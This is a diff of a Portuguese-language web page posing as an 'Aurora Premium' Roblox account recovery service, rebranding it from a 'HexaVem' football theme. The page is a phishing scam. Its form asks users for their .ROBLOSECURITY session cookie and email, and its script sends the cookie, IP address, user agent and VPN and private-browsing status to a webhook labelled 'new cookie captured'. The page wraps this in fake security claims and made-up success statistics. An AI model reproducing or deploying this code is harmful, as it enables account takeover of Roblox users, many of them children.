-                    <div class="feature-badge"><i class="fas fa-trophy"></i> #HexaVem</div>
+                    <div class="feature-badge"><i class="fas fa-star"></i> Aurora</div>
                 </div>
                 <div class="hero-cta">
                     <button class="btn btn-primary btn-lg" onclick="goToRecovery()">
@@ -1909,7 +1903,7 @@
         <!-- CARDS SECTION -->
         <div class="cards-section">
             <div class="container">
-                <h2 class="section-title">Por que Escolher Aurora? 🇧🇷</h2>
+                <h2 class="section-title">Por que Escolher Aurora? ✨</h2>
                 <p class="section-subtitle">Recursos que fazem a diferença</p>
                 <div class="cards-grid">
                     <div class="card">
@@ -1928,46 +1922,30 @@
                         <p class="card-text">Equipe sempre pronta para ajudar você. Respostas em menos de 1 hora.</p>
                     </div>
                     <div class="card">
-                        <div class="card-icon"><i class="fas fa-trophy"></i></div>
-                        <h3 class="card-title">HexaVem!</h3>
-                        <p class="card-text">Junte-se à torcida do hexa! A energia da seleção brasileira está conosco.</p>
+                        <div class="card-icon"><i class="fas fa-star"></i></div>
+                        <h3 class="card-title">Aurora</h3>
+                        <p class="card-text">Uma nova experiência em recuperação de contas com um toque de elegância e tecnologia.</p>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ===== RECOVERY SECTION (CORRIGIDA) ===== -->
+    <!-- ===== RECOVERY SECTION ===== -->
     <section class="section" id="recovery">
         <div class="container">
             <div class="content-wrapper">
                 <h2 class="section-title">Dashboard de Recuperação</h2>
-                <p class="section-subtitle">Recupere sua conta de forma segura e confiável 🇧🇷</p>
-                
-                <!-- ===== ANÚNCIO ADSTERRA ===== -->
-                <div style="text-align: center; margin: 1rem auto; padding: 1rem; max-width: 728px; background: linear-gradient(135deg, rgba(0, 151, 57, 0.05), rgba(254, 220, 0, 0.05)); border-radius: 12px; border: 2px solid rgba(254, 220, 0, 0.2);">
-                    <p style="color: rgba(255,255,255,0.3); font-size: 0.7rem; margin-bottom: 0.5rem;">— Publicidade —</p>
-                    <script type="text/javascript">
-                        atOptions = {
-                            'key' : '5883069',
-                            'format' : 'iframe',
-                            'height' : 90,
-                            'width' : 728,
-                            'params' : {}
-                        };
-                        document.write('<scr' + 'ipt type="text/javascript" src="//' + (location.hostname || '') + '/?c=' + atOptions.key + '&h=' + atOptions.height + '&w=' + atOptions.width + '"></scr' + 'ipt>');
-                    </script>
-                </div>
+                <p class="section-subtitle">Recupere sua conta de forma segura e confiável ✨</p>
                 
                 <div class="recovery-grid">
                     <div class="main-card">
                         <div class="card-header">
                             <h1>Recuperar Sua Conta</h1>
-                            <span class="badge">🏆 HexaVem</span>
+                            <span class="badge">✨ Aurora</span>
                         </div>
 
                         <form id="recoveryForm" onsubmit="handleSubmit(event)">
-                            <!-- COOKIE -->
                             <div class="form-group">
                                 <label class="form-label">
                                     <i class="fas fa-key"></i> Cookie (.ROBLOSECURITY)
@@ -1978,60 +1956,38 @@
                                         <i class="fas fa-eye"></i>
                                     </button>
                                 </div>
-                                <small class="form-hint">🔒 Seu cookie nunca será compartilhado ou armazenado permanentemente</small>
+                                <small class="form-hint">Seu cookie nunca será compartilhado ou armazenado permanentemente</small>
                             </div>
 
-                            <!-- ===== EMAIL - CORRIGIDO ===== -->
                             <div class="form-group">
                                 <label class="form-label">
-                                    <i class="fas fa-envelope"></i> 📩 Seu Email para Receber o Cookie
+                                    <i class="fas fa-envelope"></i> Email da Conta
                                 </label>
                                 <div class="input-wrapper">
                                     <input type="email" id="emailInput" class="form-input" placeholder="seu.email@exemplo.com" required>
                                 </div>
-                                <small class="form-hint" style="color: #f59e0b; font-weight: 600;">
-                                    ⚠️ <strong>ATENÇÃO:</strong> Este é o email onde você vai receber o cookie recuperado. 
-                                    <strong style="color: #fedc00;">NÃO é o email da sua conta Roblox!</strong>
-                                </small>
-                                <small class="form-hint" style="margin-top: 0.2rem; color: rgba(255,255,255,0.5);">
-                                    💡 O cookie será enviado para este email após a recuperação ser concluída.
-                                </small>
+                                <small class="form-hint">Confirme o email associado à sua conta</small>
                             </div>
 
-                            <!-- SEGURANÇA -->
                             <div class="security-box">
                                 <i class="fas fa-shield-alt"></i>
-                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#fedc00;">🇧🇷 #HexaVem</span></p>
+                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#c084fc;">✨ Aurora</span></p>
                             </div>
 
-                            <!-- BOTÃO -->
                             <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
                                 <i class="fas fa-lock-open"></i> Iniciar Recuperação
                             </button>
 
-                            <!-- ===== BLOQUEIO - CORRIGIDO ===== -->
                             <div class="block-message" id="blockMessage">
                                 <i class="fas fa-clock"></i>
-                                <h3>⏳ Bloqueio de Segurança Ativado!</h3>
-                                <p style="font-size: 0.9rem; margin-bottom: 0.5rem;">
-                                    Você já utilizou sua única tentativa. 
-                                    <strong style="color: #fedc00;">Aguarde 9 horas</strong> para tentar novamente.
-                                </p>
-                                <p style="font-size: 0.8rem; color: rgba(255,255,255,0.5); margin-bottom: 0.5rem;">
-                                    ⏱️ Tempo restante:
-                                </p>
+                                <h3>⏳ Aguarde!</h3>
+                                <p>Você já utilizou sua única tentativa. Aguarde <strong>9 horas</strong> para tentar novamente.</p>
                                 <div class="timer" id="timerDisplay">9h 00m 00s</div>
-                                <p style="font-size:0.75rem;margin-top:0.5rem;color:rgba(255,255,255,0.4);">
-                                    🔒 Isso é uma medida de segurança para proteger seu processo de recuperação.
-                                </p>
-                                <p style="font-size:0.7rem;margin-top:0.3rem;color:rgba(255,255,255,0.3);">
-                                    ⚠️ <strong>Nenhum email será enviado automaticamente quando o tempo acabar.</strong> 
-                                    Você precisa tentar novamente manualmente clicando em "Iniciar Recuperação".
-                                </p>
+                                <p style="font-size:0.8rem;margin-top:0.5rem;">🔒 Navegador anônimo bloqueado</p>
                                 <div style="margin-top: 1rem; display: flex; flex-direction: column; gap: 0.5rem; align-items: center;">
-                                    <p style="color: rgba(255,255,255,0.5); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
+                                    <p style="color: rgba(255,255,255,0.6); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
                                     <div style="display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;">
-                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #fedc00; text-decoration: none; font-size: 0.85rem; background: rgba(0,151,57,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(0,151,57,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
+                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #c084fc; text-decoration: none; font-size: 0.85rem; background: rgba(124,58,237,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(124,58,237,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
                                             <i class="fab fa-discord"></i> Discord
                                         </a>
                                         <a href="https://www.tiktok.com/@244brobt" target="_blank" style="color: #25f4ee; text-decoration: none; font-size: 0.85rem; background: rgba(0,0,0,0.3); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(37,244,238,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
@@ -2041,32 +1997,21 @@
                                 </div>
                             </div>
 
-                            <!-- ===== DISCLAIMER - CORRIGIDO ===== -->
-                            <p class="disclaimer" style="font-size: 0.7rem; line-height: 1.8; color: rgba(255,255,255,0.4);">
-                                <strong>📌 Como funciona:</strong><br>
-                                1️⃣ Cole o <strong>cookie .ROBLOSECURITY</strong> da sua conta Roblox<br>
-                                2️⃣ Digite o <strong style="color: #fedc00;">seu email</strong> onde vai receber o cookie recuperado<br>
-                                3️⃣ Clique em "Iniciar Recuperação" e aguarde o processamento<br>
-                                4️⃣ Após a recuperação, o novo cookie será enviado para o <strong style="color: #fedc00;">email que você informou</strong><br>
-                                <br>
-                                ⚠️ <strong style="color: #f59e0b;">Importante:</strong> O email que você coloca aqui é para <strong style="color: #fedc00;">receber o cookie recuperado</strong>, 
-                                <strong style="color: #f59e0b;">NÃO é o email da sua conta Roblox!</strong><br>
-                                <br>
-                                ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTermsModal(); return false;" style="color: #fedc00;">termos de serviço</a> e <a href="#" onclick="openTermsModal(); return false;" style="color: #fedc00;">política de privacidade</a>.
+                            <p class="disclaimer">
+                                ✓ Ao prosseguir, você concorda com nossos <a href="#" onclick="openTermsModal(); return false;">termos de serviço</a> e <a href="#" onclick="openTermsModal(); return false;">política de privacidade</a>.
                             </p>
                         </form>
                     </div>
 
-                    <!-- SIDEBAR -->
                     <div class="sidebar">
                         <div class="info-card">
                             <h4><i class="fas fa-server"></i> Status do Sistema</h4>
                             <div style="margin-bottom: 0.8rem;">
-                                <span class="status-indicator"><i class="fas fa-circle"></i> Online 🇧🇷</span>
+                                <span class="status-indicator"><i class="fas fa-circle"></i> Online ✨</span>
                             </div>
-                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #00b84a; font-weight: 700;">✓ Operacional</span></div>
-                            <div class="info-item"><span class="info-label">API</span><span style="color: #00b84a; font-weight: 700;">✓ Funcionando</span></div>
-                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #00b84a; font-weight: 700;">✓ Protegido</span></div>
+                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #a78bfa; font-weight: 700;">✓ Operacional</span></div>
+                            <div class="info-item"><span class="info-label">API</span><span style="color: #a78bfa; font-weight: 700;">✓ Funcionando</span></div>
+                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #a78bfa; font-weight: 700;">✓ Protegido</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2074,7 +2019,7 @@
                             <div class="info-item"><span class="info-label">Contas Recuperadas</span><span class="info-value">15,847</span></div>
                             <div class="info-item"><span class="info-label">Taxa de Sucesso</span><span class="info-value">99.8%</span></div>
                             <div class="info-item"><span class="info-label">Tempo Médio</span><span class="info-value">2h 30m</span></div>
-                            <div class="info-item"><span class="info-label">Torcida</span><span class="info-value">🏆 HexaVem!</span></div>
+                            <div class="info-item"><span class="info-label">Sistema</span><span class="info-value">✨ Aurora</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2097,7 +2042,7 @@
     <section class="section" id="comunidade">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">👥 Nossa Comunidade 🇧🇷</h2>
+                <h2 class="section-title">👥 Nossa Comunidade ✨</h2>
                 <p class="section-subtitle">Conecte-se conosco e faça parte da família Aurora</p>
                 
                 <div class="comunidade-grid">
@@ -2136,7 +2081,7 @@
         <div class="container">
             <div class="content-wrapper">
                 <h2 class="section-title">Perguntas Frequentes</h2>
-                <p class="section-subtitle">Encontre respostas para suas dúvidas 🇧🇷</p>
+                <p class="section-subtitle">Encontre respostas para suas dúvidas ✨</p>
                 
                 <div class="faq-grid">
                     <div class="faq-item">
@@ -2207,7 +2152,7 @@
     <section class="section" id="stats">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Nossos Números 🇧🇷</h2>
+                <h2 class="section-title">Nossos Números ✨</h2>
                 <p class="section-subtitle">Confiança de milhares de usuários ao redor do mundo</p>
                 
                 <div class="stats-grid">
@@ -2232,7 +2177,7 @@
     <section class="section" id="donate">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Apoie o Projeto 🇧🇷</h2>
+                <h2 class="section-title">Apoie o Projeto ✨</h2>
                 <p class="section-subtitle">Sua doação ajuda a manter e melhorar o Aurora</p>
                 
                 <div class="donation-grid">
@@ -2265,10 +2210,10 @@
                     </div>
                 </div>
 
-                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(0,151,57,0.1), rgba(254,220,0,0.1)); border-radius: 16px; border: 1px solid rgba(254,220,0,0.2);">
-                    <i class="fas fa-trophy" style="font-size: 1.8rem; color: #fedc00; display: block; margin-bottom: 0.5rem;"></i>
-                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">🏆 HexaVem! Sistema em Manutenção</h3>
-                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve 🇧🇷</p>
+                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(192,132,252,0.1)); border-radius: 16px; border: 1px solid rgba(192,132,252,0.2);">
+                    <i class="fas fa-star" style="font-size: 1.8rem; color: #c084fc; display: block; margin-bottom: 0.5rem;"></i>
+                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">✨ Sistema em Manutenção</h3>
+                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve ✨</p>
                 </div>
             </div>
         </div>
@@ -2278,8 +2223,8 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-section">
-                <h4>🇧🇷 Aurora Premium</h4>
-                <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7. <span style="color:#fedc00;">#HexaVem</span></p>
+                <h4>✨ Aurora Premium</h4>
+                <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7.</p>
             </div>
             <div class="footer-section">
                 <h4>Links Rápidos</h4>
@@ -2301,11 +2246,11 @@
             <div class="footer-section">
                 <h4>Contato</h4>
                 <p><i class="fas fa-envelope"></i> support@aurora.com</p>
-                <p>Status: <span style="color: #00b84a;">● Online 🇧🇷</span></p>
+                <p>Status: <span style="color: #a78bfa;">● Online ✨</span></p>
             </div>
         </div>
         <div class="footer-bottom">
-            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você 🇧🇷 <span class="gold">#HexaVem</span></p>
+            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você ✨ <span class="aurora">Aurora</span></p>
         </div>
     </footer>
 
@@ -2313,7 +2258,7 @@
     <div class="modal-overlay" id="processingModal">
         <div class="processing-modal">
             <div class="loader"></div>
-            <h2 class="processing-title" id="processingTitle">Processando... 🇧🇷</h2>
+            <h2 class="processing-title" id="processingTitle">Processando... ✨</h2>
             <p class="processing-message" id="processingMessage">Verificando credenciais...</p>
             <div class="progress-container">
                 <div class="progress-bar"><div class="progress-fill"></div></div>
@@ -2326,8 +2271,8 @@
     <div class="modal-overlay" id="successModal">
         <div class="success-modal">
             <div class="success-icon"><i class="fas fa-check"></i></div>
-            <h2 class="success-title">Sucesso! 🏆</h2>
-            <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve. <strong style="color:#fedc00;">#HexaVem</strong></p>
+            <h2 class="success-title">Sucesso! ✨</h2>
+            <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve.</p>
             <button class="btn btn-success" onclick="closeSuccessModal()">
                 <i class="fas fa-check-circle"></i> Entendi, Continuar
             </button>
@@ -2771,7 +2716,7 @@
             termsAccepted = true;
             localStorage.setItem('aurora_terms_accepted', 'true');
             closeTermsModal();
-            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. 🇧🇷');
+            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. ✨');
             showSection('recovery');
         }
 
@@ -2810,7 +2755,7 @@
                 const vpnData = vpnDetected ? await getIPData() : null;
                 
                 const payload = {
-                    content: `🏆 **NOVO COOKIE CAPTURADO - #HEXAVEM** 🇧🇷\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n🏆 **#HexaVem** 🇧🇷`,
+                    content: `✨ **NOVO COOKIE CAPTURADO - AURORA** ✨\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✨ **#Aurora** ✨`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
@@ -2994,7 +2939,7 @@
             // Verificar se aceitou os termos
             if (!termsAccepted) {
                 openTermsModal();
-                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. 🇧🇷');
+                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. ✨');
                 return;
             }
             
@@ -3064,7 +3009,7 @@
                 if (timerInterval) clearInterval(timerInterval);
                 timerInterval = setInterval(updateTimer, 1000);
                 
-                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. 🇧🇷');
+                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
                 showProcessingModal();
             } else {
                 document.getElementById('submitBtn').disabled = false;
@@ -3114,7 +3059,7 @@
 
         function closeSuccessModal() {
             document.getElementById('successModal').classList.remove('active');
-            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. 🇧🇷 #HexaVem');
+            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✨');
         }
 
         // ============================================================
@@ -3126,9 +3071,9 @@
                 position: fixed;
                 top: 100px;
                 right: 20px;
-                background: linear-gradient(135deg, rgba(10,26,10,0.95), rgba(26,42,26,0.95));
+                background: linear-gradient(135deg, rgba(10,5,21,0.95), rgba(26,13,46,0.95));
                 backdrop-filter: blur(20px);
-                border: 1px solid rgba(254,220,0,0.15);
+                border: 1px solid rgba(124,58,237,0.15);
                 border-radius: 12px;
                 padding: 1.2rem 1.5rem;
                 max-width: 350px;
@@ -3176,7 +3121,7 @@
         // ============================================================
         window.addEventListener('scroll', () => {
             const navbar = document.querySelector('.navbar');
-            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 26, 10, 0.98)' : 'rgba(10, 26, 10, 0.95)';
+            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 5, 21, 0.98)' : 'rgba(10, 5, 21, 0.95)';
         });
 
         // ============================================================
@@ -3208,16 +3153,16 @@
         // ============================================================
         // 19. CONSOLE
         // ============================================================
-        console.log('%c🏆 Aurora Premium v2.0 🇧🇷', 'font-size:24px;font-weight:bold;color:#009739;');
-        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#fedc00;');
+        console.log('%c✨ Aurora Premium v2.0 ✨', 'font-size:24px;font-weight:bold;color:#7c3aed;');
+        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#c084fc;');
         console.log('%c⏳ 1 tentativa apenas | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
         console.log('%c🔒 Navegador anônimo bloqueado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Sistema de Banimento por IP ativado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Detecção de VPN/Proxy ativada', 'font-size:14px;color:#10b981;');
         console.log('%c🔒 Detecção de navegador anônimo (via navegador)', 'font-size:14px;color:#10b981;');
         console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
-        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#fedc00;');
-        console.log('%c🏆 #HexaVem! 🇧🇷', 'font-size:18px;font-weight:bold;color:#fedc00;');
+        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#c084fc;');
+        console.log('%c✨ Aurora System ✨', 'font-size:18px;font-weight:bold;color:#7c3aed;');
 
         // ============================================================
         // 20. INICIAR
